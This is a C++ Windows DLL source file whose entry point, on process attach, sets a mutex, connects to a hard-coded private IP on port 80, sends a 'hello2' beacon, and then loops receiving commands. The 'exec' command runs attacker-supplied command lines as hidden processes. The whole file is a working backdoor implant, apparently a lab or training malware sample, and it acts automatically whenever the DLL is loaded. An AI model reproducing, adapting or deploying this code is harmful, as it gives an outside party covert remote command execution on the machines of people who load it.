// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <cstdio>
#include <ctime>
#include <iostream>
#include <Windows.h>
#include <WS2tcpip.h>
#include <WinSock2.h>

#pragma comment(lib, "Ws2_32.lib")

// Definitions
#define MW_MUTEX L"SADFHUHF"
#define IP_ADDR "192.168.68.132"
#define MSG_HELLO "hello2"
#define BUF_SIZE 4096

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  dwReason,
                       LPVOID lpReserved
                     )
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
    {
        HANDLE hMutex = nullptr;
        WSADATA wsaData{};
        SOCKET sock = 0;
        struct sockaddr_in sockAddr { 0 };
        char buffer[BUF_SIZE];
        int bytesRead = 0;
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(STARTUPINFOA);
        ZeroMemory(&pi, sizeof(pi));

        // Check if the process is alredy running, else create mutex
        hMutex = OpenMutexW(MUTEX_ALL_ACCESS, TRUE, MW_MUTEX);
        if (hMutex != NULL)
            return TRUE;

        hMutex = CreateMutexW(NULL, TRUE, MW_MUTEX);
        
        // Start the Win Socket
        if (WSAStartup(WINSOCK_VERSION, &wsaData) != 0) 
        {
            // printf_s("Error WSAStartup: %d\n", WSAGetLastError());
            goto _CleanUp;
        }

        // Create a socket
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET)
        {
            // printf_s("Error socket: %d\n", WSAGetLastError());
            goto _CleanUp;
        }

        // Set up remote address information and connect to it
        sockAddr.sin_family = AF_INET;
        sockAddr.sin_port = htons(80);
        sockAddr.sin_addr.s_addr = inet_addr(IP_ADDR);

        if (connect(sock, reinterpret_cast<sockaddr*>(&sockAddr), sizeof(sockAddr)) == SOCKET_ERROR)
        {
            // printf_s("Error connect: %d\n", WSAGetLastError());
            goto _CleanUp;
        }

        while (true)
        {
            // Send beaconing "hello" and shutdown send
            if (send(sock, MSG_HELLO, sizeof(MSG_HELLO) - 1, 0) == SOCKET_ERROR)
            {
                // printf_s("Error send: %d\n", WSAGetLastError());
                goto _CleanUp;
            }

            if (shutdown(sock, SD_SEND) == SOCKET_ERROR)
            {
                // printf_s("Error shutdown: %d\n", WSAGetLastError());
                goto _CleanUp;
            }

            // Receive command back
            bytesRead = recv(sock, buffer, sizeof(buffer), 0);
            if (bytesRead <= 0)
                break;
            
            if (strncmp("sleep", buffer, 5) == 0)
            {
                Sleep(0x60000);
            }
            else if (strncmp("exec", buffer, 4) == 0)
            {
                // Execute process
                CreateProcessA(NULL, (buffer+5), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
            }
            else if (buffer[0] != 'q')
            {
                Sleep(0x60000);
            }
            else
            {
                goto _CleanUp;
            }
        }

    _CleanUp:
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(sock);
        WSACleanup();
        break;
    }
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
